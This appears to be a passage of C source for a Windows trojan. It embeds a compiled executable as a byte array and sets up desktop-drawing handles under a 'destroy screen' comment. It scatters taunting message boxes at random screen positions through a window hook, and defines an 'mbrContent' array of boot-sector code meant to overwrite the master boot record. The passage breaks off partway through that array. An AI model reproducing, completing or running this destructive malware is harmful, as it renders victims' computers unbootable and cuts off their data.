0x6D, 0x00, 0x39, 0x00, 0x5F, 0x69, 0x6E, 0x69, 0x74, 0x74, 0x65, 0x72,
0x6D, 0x5F, 0x65, 0x00, 0x58, 0x00, 0x65, 0x78, 0x69, 0x74, 0x00, 0x00,
0x25, 0x00, 0x5F, 0x65, 0x78, 0x69, 0x74, 0x00, 0x54, 0x00, 0x5F, 0x73,
0x65, 0x74, 0x5F, 0x66, 0x6D, 0x6F, 0x64, 0x65, 0x00, 0x00, 0x05, 0x00,
0x5F, 0x5F, 0x70, 0x5F, 0x5F, 0x5F, 0x61, 0x72, 0x67, 0x63, 0x00, 0x00,
0x06, 0x00, 0x5F, 0x5F, 0x70, 0x5F, 0x5F, 0x5F, 0x61, 0x72, 0x67, 0x76,
0x00, 0x00, 0x17, 0x00, 0x5F, 0x63, 0x65, 0x78, 0x69, 0x74, 0x00, 0x00,
0x16, 0x00, 0x5F, 0x63, 0x5F, 0x65, 0x78, 0x69, 0x74, 0x00, 0x3F, 0x00,
0x5F, 0x72, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x5F, 0x74, 0x68,
0x72, 0x65, 0x61, 0x64, 0x5F, 0x6C, 0x6F, 0x63, 0x61, 0x6C, 0x5F, 0x65,
0x78, 0x65, 0x5F, 0x61, 0x74, 0x65, 0x78, 0x69, 0x74, 0x5F, 0x63, 0x61,
0x6C, 0x6C, 0x62, 0x61, 0x63, 0x6B, 0x00, 0x00, 0x08, 0x00, 0x5F, 0x63,
0x6F, 0x6E, 0x66, 0x69, 0x67, 0x74, 0x68, 0x72, 0x65, 0x61, 0x64, 0x6C,
0x6F, 0x63, 0x61, 0x6C, 0x65, 0x00, 0x16, 0x00, 0x5F, 0x73, 0x65, 0x74,
0x5F, 0x6E, 0x65, 0x77, 0x5F, 0x6D, 0x6F, 0x64, 0x65, 0x00, 0x01, 0x00,
0x5F, 0x5F, 0x70, 0x5F, 0x5F, 0x63, 0x6F, 0x6D, 0x6D, 0x6F, 0x64, 0x65,
0x00, 0x00, 0x36, 0x00, 0x5F, 0x69, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C,
0x69, 0x7A, 0x65, 0x5F, 0x6F, 0x6E, 0x65, 0x78, 0x69, 0x74, 0x5F, 0x74,
0x61, 0x62, 0x6C, 0x65, 0x00, 0x00, 0x3E, 0x00, 0x5F, 0x72, 0x65, 0x67,
0x69, 0x73, 0x74, 0x65, 0x72, 0x5F, 0x6F, 0x6E, 0x65, 0x78, 0x69, 0x74,
0x5F, 0x66, 0x75, 0x6E, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x1F, 0x00,
0x5F, 0x63, 0x72, 0x74, 0x5F, 0x61, 0x74, 0x65, 0x78, 0x69, 0x74, 0x00,
0x1D, 0x00, 0x5F, 0x63, 0x6F, 0x6E, 0x74, 0x72, 0x6F, 0x6C, 0x66, 0x70,
0x5F, 0x73, 0x00, 0x00, 0x6A, 0x00, 0x74, 0x65, 0x72, 0x6D, 0x69, 0x6E,
0x61, 0x74, 0x65, 0x00, 0x61, 0x70, 0x69, 0x2D, 0x6D, 0x73, 0x2D, 0x77,
0x69, 0x6E, 0x2D, 0x63, 0x72, 0x74, 0x2D, 0x72, 0x75, 0x6E, 0x74, 0x69,
0x6D, 0x65, 0x2D, 0x6C, 0x31, 0x2D, 0x31, 0x2D, 0x30, 0x2E, 0x64, 0x6C,
0x6C, 0x00, 0x61, 0x70, 0x69, 0x2D, 0x6D, 0x73, 0x2D, 0x77, 0x69, 0x6E,
0x2D, 0x63, 0x72, 0x74, 0x2D, 0x6D, 0x61, 0x74, 0x68, 0x2D, 0x6C, 0x31,
0x2D, 0x31, 0x2D, 0x30, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x61, 0x70,
0x69, 0x2D, 0x6D, 0x73, 0x2D, 0x77, 0x69, 0x6E, 0x2D, 0x63, 0x72, 0x74,
0x2D, 0x73, 0x74, 0x64, 0x69, 0x6F, 0x2D, 0x6C, 0x31, 0x2D, 0x31, 0x2D,
0x30, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x61, 0x70, 0x69, 0x2D, 0x6D, 0x73,
0x2D, 0x77, 0x69, 0x6E, 0x2D, 0x63, 0x72, 0x74, 0x2D, 0x6C, 0x6F, 0x63,
0x61, 0x6C, 0x65, 0x2D, 0x6C, 0x31, 0x2D, 0x31, 0x2D, 0x30, 0x2E, 0x64,
0x6C, 0x6C, 0x00, 0x00, 0x61, 0x70, 0x69, 0x2D, 0x6D, 0x73, 0x2D, 0x77,
0x69, 0x6E, 0x2D, 0x63, 0x72, 0x74, 0x2D, 0x68, 0x65, 0x61, 0x70, 0x2D,
0x6C, 0x31, 0x2D, 0x31, 0x2D, 0x30, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00,
0xB1, 0x05, 0x55, 0x6E, 0x68, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x64, 0x45,
0x78, 0x63, 0x65, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x46, 0x69, 0x6C, 0x74,
0x65, 0x72, 0x00, 0x00, 0x71, 0x05, 0x53, 0x65, 0x74, 0x55, 0x6E, 0x68,
0x61, 0x6E, 0x64, 0x6C, 0x65, 0x64, 0x45, 0x78, 0x63, 0x65, 0x70, 0x74,
0x69, 0x6F, 0x6E, 0x46, 0x69, 0x6C, 0x74, 0x65, 0x72, 0x00, 0x90, 0x05,
0x54, 0x65, 0x72, 0x6D, 0x69, 0x6E, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6F,
0x63, 0x65, 0x73, 0x73, 0x00, 0x00, 0x89, 0x03, 0x49, 0x73, 0x50, 0x72,
0x6F, 0x63, 0x65, 0x73, 0x73, 0x6F, 0x72, 0x46, 0x65, 0x61, 0x74, 0x75,
0x72, 0x65, 0x50, 0x72, 0x65, 0x73, 0x65, 0x6E, 0x74, 0x00, 0x4F, 0x04,
0x51, 0x75, 0x65, 0x72, 0x79, 0x50, 0x65, 0x72, 0x66, 0x6F, 0x72, 0x6D,
0x61, 0x6E, 0x63, 0x65, 0x43, 0x6F, 0x75, 0x6E, 0x74, 0x65, 0x72, 0x00,
0x1B, 0x02, 0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6E, 0x74,
0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x49, 0x64, 0x00, 0xEC, 0x02,
0x47, 0x65, 0x74, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x54, 0x69, 0x6D,
0x65, 0x41, 0x73, 0x46, 0x69, 0x6C, 0x65, 0x54, 0x69, 0x6D, 0x65, 0x00,
0x66, 0x03, 0x49, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65,
0x53, 0x4C, 0x69, 0x73, 0x74, 0x48, 0x65, 0x61, 0x64, 0x00, 0x82, 0x03,
0x49, 0x73, 0x44, 0x65, 0x62, 0x75, 0x67, 0x67, 0x65, 0x72, 0x50, 0x72,
0x65, 0x73, 0x65, 0x6E, 0x74, 0x00, 0x7B, 0x02, 0x47, 0x65, 0x74, 0x4D,
0x6F, 0x64, 0x75, 0x6C, 0x65, 0x48, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x57,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0xB1, 0x19, 0xBF, 0x44, 0x4E, 0xE6, 0x40, 0xBB,
0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x01, 0x00, 0x18, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x80,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x80,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x01, 0x00, 0x09, 0x04, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00,
0x60, 0x40, 0x00, 0x00, 0x7D, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x3C, 0x3F, 0x78, 0x6D, 0x6C, 0x20, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6F,
0x6E, 0x3D, 0x27, 0x31, 0x2E, 0x30, 0x27, 0x20, 0x65, 0x6E, 0x63, 0x6F,
0x64, 0x69, 0x6E, 0x67, 0x3D, 0x27, 0x55, 0x54, 0x46, 0x2D, 0x38, 0x27,
0x20, 0x73, 0x74, 0x61, 0x6E, 0x64, 0x61, 0x6C, 0x6F, 0x6E, 0x65, 0x3D,
0x27, 0x79, 0x65, 0x73, 0x27, 0x3F, 0x3E, 0x0D, 0x0A, 0x3C, 0x61, 0x73,
0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79, 0x20, 0x78, 0x6D, 0x6C, 0x6E, 0x73,
0x3D, 0x27, 0x75, 0x72, 0x6E, 0x3A, 0x73, 0x63, 0x68, 0x65, 0x6D, 0x61,
0x73, 0x2D, 0x6D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x2D,
0x63, 0x6F, 0x6D, 0x3A, 0x61, 0x73, 0x6D, 0x2E, 0x76, 0x31, 0x27, 0x20,
0x6D, 0x61, 0x6E, 0x69, 0x66, 0x65, 0x73, 0x74, 0x56, 0x65, 0x72, 0x73,
0x69, 0x6F, 0x6E, 0x3D, 0x27, 0x31, 0x2E, 0x30, 0x27, 0x3E, 0x0D, 0x0A,
0x20, 0x20, 0x3C, 0x74, 0x72, 0x75, 0x73, 0x74, 0x49, 0x6E, 0x66, 0x6F,
0x20, 0x78, 0x6D, 0x6C, 0x6E, 0x73, 0x3D, 0x22, 0x75, 0x72, 0x6E, 0x3A,
0x73, 0x63, 0x68, 0x65, 0x6D, 0x61, 0x73, 0x2D, 0x6D, 0x69, 0x63, 0x72,
0x6F, 0x73, 0x6F, 0x66, 0x74, 0x2D, 0x63, 0x6F, 0x6D, 0x3A, 0x61, 0x73,
0x6D, 0x2E, 0x76, 0x33, 0x22, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20,
0x3C, 0x73, 0x65, 0x63, 0x75, 0x72, 0x69, 0x74, 0x79, 0x3E, 0x0D, 0x0A,
0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x72, 0x65, 0x71, 0x75, 0x65,
0x73, 0x74, 0x65, 0x64, 0x50, 0x72, 0x69, 0x76, 0x69, 0x6C, 0x65, 0x67,
0x65, 0x73, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
0x20, 0x3C, 0x72, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x65, 0x64, 0x45,
0x78, 0x65, 0x63, 0x75, 0x74, 0x69, 0x6F, 0x6E, 0x4C, 0x65, 0x76, 0x65,
0x6C, 0x20, 0x6C, 0x65, 0x76, 0x65, 0x6C, 0x3D, 0x27, 0x61, 0x73, 0x49,
0x6E, 0x76, 0x6F, 0x6B, 0x65, 0x72, 0x27, 0x20, 0x75, 0x69, 0x41, 0x63,
0x63, 0x65, 0x73, 0x73, 0x3D, 0x27, 0x66, 0x61, 0x6C, 0x73, 0x65, 0x27,
0x20, 0x2F, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C,
0x2F, 0x72, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x65, 0x64, 0x50, 0x72,
0x69, 0x76, 0x69, 0x6C, 0x65, 0x67, 0x65, 0x73, 0x3E, 0x0D, 0x0A, 0x20,
0x20, 0x20, 0x20, 0x3C, 0x2F, 0x73, 0x65, 0x63, 0x75, 0x72, 0x69, 0x74,
0x79, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x3C, 0x2F, 0x74, 0x72, 0x75, 0x73,
0x74, 0x49, 0x6E, 0x66, 0x6F, 0x3E, 0x0D, 0x0A, 0x3C, 0x2F, 0x61, 0x73,
0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79, 0x3E, 0x0D, 0x0A, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
0x84, 0x01, 0x00, 0x00, 0x27, 0x30, 0x3C, 0x30, 0x57, 0x30, 0x6A, 0x30,
0x78, 0x30, 0x7F, 0x30, 0x9C, 0x30, 0xA8, 0x30, 0xB3, 0x30, 0xCA, 0x30,
0xDA, 0x30, 0xFC, 0x30, 0x22, 0x31, 0x2A, 0x31, 0x32, 0x31, 0x39, 0x31,
0x3E, 0x31, 0x46, 0x31, 0x4D, 0x31, 0x52, 0x31, 0x5A, 0x31, 0x73, 0x31,
0x7A, 0x31, 0x87, 0x31, 0xA7, 0x31, 0xB7, 0x31, 0xBE, 0x31, 0xC4, 0x31,
0xCD, 0x31, 0xD2, 0x31, 0xE3, 0x31, 0xF7, 0x31, 0xFC, 0x31, 0x02, 0x32,
0x08, 0x32, 0x0F, 0x32, 0x17, 0x32, 0x54, 0x32, 0x5B, 0x32, 0x64, 0x32,
0x6C, 0x32, 0x8F, 0x32, 0x9C, 0x32, 0xB5, 0x32, 0xF9, 0x32, 0x22, 0x33,
0x89, 0x33, 0xB4, 0x33, 0xC9, 0x33, 0xCE, 0x33, 0xD3, 0x33, 0xF4, 0x33,
0xF9, 0x33, 0x06, 0x34, 0x40, 0x34, 0x19, 0x35, 0x22, 0x35, 0x2D, 0x35,
0x34, 0x35, 0x47, 0x35, 0x55, 0x35, 0x5B, 0x35, 0x61, 0x35, 0x67, 0x35,
0x6D, 0x35, 0x73, 0x35, 0x7A, 0x35, 0x81, 0x35, 0x88, 0x35, 0x8F, 0x35,
0x96, 0x35, 0x9D, 0x35, 0xA4, 0x35, 0xAC, 0x35, 0xB4, 0x35, 0xBC, 0x35,
0xC8, 0x35, 0xD1, 0x35, 0xD6, 0x35, 0xDC, 0x35, 0xE6, 0x35, 0xF0, 0x35,
0x00, 0x36, 0x10, 0x36, 0x20, 0x36, 0x29, 0x36, 0x89, 0x36, 0xB5, 0x36,
0xE8, 0x36, 0x0E, 0x37, 0x1D, 0x37, 0x34, 0x37, 0x3A, 0x37, 0x40, 0x37,
0x46, 0x37, 0x4C, 0x37, 0x52, 0x37, 0x58, 0x37, 0x6D, 0x37, 0x82, 0x37,
0x89, 0x37, 0x8F, 0x37, 0xA1, 0x37, 0xAB, 0x37, 0x13, 0x38, 0x20, 0x38,
0x48, 0x38, 0x5A, 0x38, 0x99, 0x38, 0xA8, 0x38, 0xB1, 0x38, 0xBE, 0x38,
0xD4, 0x38, 0x0E, 0x39, 0x17, 0x39, 0x2B, 0x39, 0x31, 0x39, 0x5E, 0x39,
0x64, 0x39, 0x8A, 0x39, 0x93, 0x39, 0x99, 0x39, 0xAC, 0x39, 0x78, 0x3A,
0x98, 0x3A, 0xA2, 0x3A, 0xC2, 0x3A, 0x02, 0x3B, 0x08, 0x3B, 0x65, 0x3B,
0x6E, 0x3B, 0x73, 0x3B, 0x86, 0x3B, 0x9A, 0x3B, 0x9F, 0x3B, 0xB2, 0x3B,
0xD1, 0x3B, 0xEE, 0x3B, 0x30, 0x3C, 0x35, 0x3C, 0x49, 0x3C, 0x53, 0x3C,
0x5C, 0x3C, 0x03, 0x3D, 0x0C, 0x3D, 0x14, 0x3D, 0x4F, 0x3D, 0x59, 0x3D,
0x62, 0x3D, 0x6B, 0x3D, 0x80, 0x3D, 0x89, 0x3D, 0xB8, 0x3D, 0xC1, 0x3D,
0xCA, 0x3D, 0xD8, 0x3D, 0xE1, 0x3D, 0x03, 0x3E, 0x0A, 0x3E, 0x19, 0x3E,
0x23, 0x3E, 0x29, 0x3E, 0x2F, 0x3E, 0x35, 0x3E, 0x3B, 0x3E, 0x41, 0x3E,
0x47, 0x3E, 0x4D, 0x3E, 0x53, 0x3E, 0x59, 0x3E, 0x5F, 0x3E, 0x65, 0x3E,
0x6B, 0x3E, 0x71, 0x3E, 0x77, 0x3E, 0x7D, 0x3E, 0x83, 0x3E, 0x89, 0x3E,
0x8F, 0x3E, 0x95, 0x3E, 0x9B, 0x3E, 0xA1, 0x3E, 0xA7, 0x3E, 0xAD, 0x3E,
0xB3, 0x3E, 0xB9, 0x3E, 0xBF, 0x3E, 0xC5, 0x3E, 0xCF, 0x3E, 0x00, 0x00,
0x00, 0x20, 0x00, 0x00, 0x24, 0x00, 0x00, 0x00, 0x04, 0x31, 0x0C, 0x31,
0x18, 0x31, 0x1C, 0x31, 0x38, 0x31, 0x3C, 0x31, 0xC4, 0x32, 0xC8, 0x32,
0xD0, 0x32, 0x40, 0x33, 0x6C, 0x36, 0x70, 0x36, 0x8C, 0x36, 0x90, 0x36,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00 };
const size_t kwp_len = sizeof(kwp);


/* destroy screen variables */
HDC hdc = GetDC(HWND_DESKTOP);
int sw = GetSystemMetrics(SM_CXSCREEN);
int sh = GetSystemMetrics(SM_CYSCREEN);
HDC hW;
HWND hwnd;
RECT rekt;
int w, h;
POINT Pt[3];

HCRYPTPROV prov;

int scrw, scrh;


int random() {
    int out;
    CryptGenRandom(prov, sizeof(out), (BYTE*)(&out));
    return out & 0x7fffffff;
}


/* unused messages for message boxes*/

const int icon[] = {
    MB_ICONEXCLAMATION,
    MB_ICONWARNING,
    MB_ICONINFORMATION,
};

const char* title[] = {
    "úñåáñþéð mawøá®é",
    "\u0022ngoe\u0022",
    "UnWaNtEd vIrUs",
    "uNwAnTeD ViRuS",
    "\n",
};


const char* msgs[] = {
    "Hello? Do you like my trojan",
    "R U Crazy? U Ran UNWANTED VIRUS!!",
    "See how your computer is destroyed",
    "\n",
    "\u0022Really this is so?\u0022",
    "Do you like the desk-top Back--Ground",
    "Are you happy?",
    "Do you have a live right now?",
    "\nWhats going on?\n",
    "Help!!!",
    "zzzzzzzzzzz",
    "Enjoy the game after this!",
    "I will kill everyone\nStarting by you first",
    "dID your anti-VIRUS stop this?",
};


/* for message boxes on random position */
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {

    scrw = GetSystemMetrics(SM_CXSCREEN);
    scrh = GetSystemMetrics(SM_CYSCREEN);
    if (nCode == HCBT_CREATEWND) {
        CREATESTRUCT* pcs = ((CBT_CREATEWND*)lParam)->lpcs;

        if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
            HWND hwnd = (HWND)wParam;

            int x = random() % (scrw - pcs->cx);
            int y = random() % (scrh - pcs->cy);

            pcs->x = x;
            pcs->y = y;
        }
    }

    return CallNextHookEx(0, nCode, wParam, lParam);
}

/* overwrite mbr content */
const unsigned char mbrContent[] = { 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xFC, 0xB8, 0x00, 0xA0, 0x8E, 0xD8, 0x8E, 0xC0, 0xB4, 0x04, 0xA3,
0x90, 0xFC, 0x31, 0xC0, 0xB9, 0x48, 0x7E, 0x31, 0xFF, 0xF3, 0xAB, 0x8B, 0x05, 0x40, 0x40, 0xAB,
0x88, 0xC4, 0x92, 0xB8, 0x00, 0x1C, 0xAB, 0xB8, 0x98, 0xE6, 0xAB, 0xB8, 0x28, 0x14, 0xBB, 0x10,
0x25, 0xB1, 0x0B, 0xAB, 0x83, 0xC0, 0x16, 0x93, 0xAB, 0xFE, 0xC4, 0x93, 0xE2, 0xF5, 0x05, 0x8E,
0x15, 0x80, 0xFF, 0x5C, 0x75, 0xEB, 0xBF, 0xA0, 0xD4, 0xB1, 0x05, 0xB8, 0x04, 0x0B, 0xE8, 0x85,
0x01, 0x83, 0xC7, 0x3C, 0xE2, 0xF5, 0xBE, 0x96, 0xFC, 0x80, 0x7C, 0x02, 0x20, 0x72, 0x2D, 0xFE,
0xC5, 0x80, 0xFD, 0x37, 0x74, 0xAC, 0xAD, 0x97, 0xAD, 0x3C, 0x28, 0x74, 0x0B, 0x3C, 0x20, 0x75,
0x04, 0xC6, 0x44, 0xFE, 0x28, 0xE8, 0x5E, 0x01, 0x81, 0xFE, 0x72, 0xFD, 0x75, 0xDB, 0x88, 0xF0,
0x2C, 0x02, 0x72, 0xD2, 0x34, 0x01, 0x88, 0xC2, 0x88, 0xC6, 0xEB, 0xCA, 0x80, 0x74, 0x02, 0x08,
0x45, 0x83, 0xE5, 0x07, 0x52, 0x56, 0x55, 0x75, 0x0E, 0xB4, 0x00, 0xCD, 0x1A, 0x3B, 0x16, 0x8C,
0xFC, 0x74, 0xF6, 0x89, 0x16, 0x8C, 0xFC, 0xBE, 0x80, 0xFC, 0xB9, 0x04, 0x00, 0xAD, 0x3D, 0x40,
0x01, 0x97, 0x72, 0x43, 0xE8, 0x17, 0x01, 0x81, 0xEF, 0x42, 0x01, 0x8A, 0x05, 0x2C, 0x20, 0x72,
0x29, 0x56, 0x57, 0xB4, 0x04, 0xF6, 0xE4, 0x01, 0xC6, 0xAD, 0x97, 0xC6, 0x04, 0x20, 0xB8, 0x08,
0x0E, 0xE8, 0x02, 0x01, 0x5F, 0x5E, 0xEB, 0x1F, 0xAD, 0x09, 0xC0, 0x74, 0x2D, 0x3D, 0x00, 0xF0,
0x97, 0x73, 0x14, 0xE8, 0xE8, 0x00, 0x81, 0xC7, 0x3E, 0x01, 0xB8, 0x0C, 0x0C, 0x89, 0x7C, 0xFE,
0x80, 0xBD, 0x40, 0x01, 0x0B, 0x75, 0x05, 0x31, 0xC0, 0x89, 0x44, 0xFE, 0x80, 0x3D, 0x1C, 0x75,
0x06, 0xC7, 0x06, 0x92, 0xFC, 0x38, 0x0A, 0xE8, 0xC6, 0x00, 0xE2, 0xCC, 0xBE, 0x92, 0xFC, 0xAD,
0x08, 0xC0, 0x74, 0x0C, 0x04, 0x08, 0x75, 0x08, 0xB4, 0x1C, 0xFE, 0x0E, 0x91, 0xFC, 0x78, 0x4A,
0x89, 0x44, 0xFE, 0x8B, 0x3C, 0xE8, 0xAE, 0x00, 0x75, 0x2E, 0xB4, 0x02, 0xCD, 0x16, 0xA8, 0x04,
